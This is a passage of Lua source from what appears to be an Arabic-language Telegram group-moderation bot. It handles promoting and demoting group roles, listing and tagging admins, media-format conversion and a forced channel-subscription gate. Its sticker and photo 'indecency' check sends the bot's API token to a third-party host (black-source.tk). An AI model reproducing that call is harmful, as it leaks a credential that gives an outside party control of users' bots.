t = " ◉ لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع الفا") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته الفا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع الفا @(.*)$") and Sudo(msg) then
local username = text:match("^رفع الفا @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته الفا'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع الفا (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع الفا (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته الفا'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم ترقيته الفا'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل الفا") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من الفا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل الفا @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل الفا @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من الفا'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل الفا (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل الفا (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من الفا'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تنزيله من الفا'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------

if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then      
sticker_id = msg.content_.sticker_.sticker_.persistent_id_
st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
if eker.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = "◉ المنشئين الاساسين تعالو مخرب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "◉ ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply","◉ قام بنشر ملصق اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then
photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
Sto = JSON.decode(Srrt)
if Sto.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = "◉ المنشئين الاساسين تعالو مخرب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "◉ ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply","◉ قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if text == 'تفعيل التحويل' and CoSu(msg) then   
if database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:sofi'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التحويل' and CoSu(msg) then  
if not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:sofi'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل امر تحويل'
else
Text = '\n ◉ بالتاكيد تم تعطيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.photo_ then 
local pn = result.content_.photo_.sizes_[1].photo_.persistent_id_
Addsticker(msg,msg.chat_id_,pn,msg.sender_user_id_..'.png')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.voice_ then 
local mr = result.content_.voice_.voice_.persistent_id_ 
Addmp3(msg,msg.chat_id_,mr,msg.sender_user_id_..'.mp3')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.audio_ then 
local mr = result.content_.audio_.audio_.persistent_id_
Addvoi(msg,msg.chat_id_,mr,msg.sender_user_id_..'.ogg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.sticker_ then 
local Str = result.content_.sticker_.sticker_.persistent_id_ 
Addjpg(msg,msg.chat_id_,Str,msg.sender_user_id_..'.jpg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
-------------------
------------------------------------------------------------------------
if text == ("مسح الاساسين") and CoSu(msg) then
database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح المنشئين الاساسين')
return false
end
if text == 'المنشئين الاساسين' and CoSu(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n ◉ قائمة المنشئين الاساسين \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("تاك للمنشئين الاساسين") or text == ("صيح المنشئين الاساسين") then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n ◉ وينكم تعالو يريدوكم بالجروب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^رفع منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته منشئ اساسي'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^رفع منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉  يرجى الاشتراك بالقناه اولا \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^تنزيل منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من الاساسيين'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المنشئين' and BasicConstructor(msg) then
database:del(bot_id..'Constructor'..msg.chat_id_)
texts = ' ◉ تم مسح المنشئين '
send(msg.chat_id_, msg.id_, texts)
end

if text == ("المنشئين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n ◉ قائمة المنشئين \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنشئين") or text == ("صيح المنشئين") then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n ◉ وينكم تعالو يريدوكم بالجروب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text ==("المنشئ") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_," ◉ حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "SRC-DRAGON")
send(msg.chat_id_, msg.id_," ◉ منشئ الجروب ← ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
end
if text == "رفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته منشئ'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉  العضو ← '..userid..''
status  = '\n ◉ تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المنشئين'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
------------------------------------------------------------------------
if text == 'مسح المدراء' and Constructor(msg) then
database:del(bot_id..'Manager'..msg.chat_id_)
texts = ' ◉ تم مسح المدراء '
send(msg.chat_id_, msg.id_, texts)
end
if text == ("المدراء") and Constructor(msg) then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n ◉ قائمة المدراء \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمدراء") or text == ("صيح المدراء") then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n ◉ وينكم تعالو يريدوكم بالجروب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مدير @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته مدير'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Manager'..msg.chat_id_, userid)
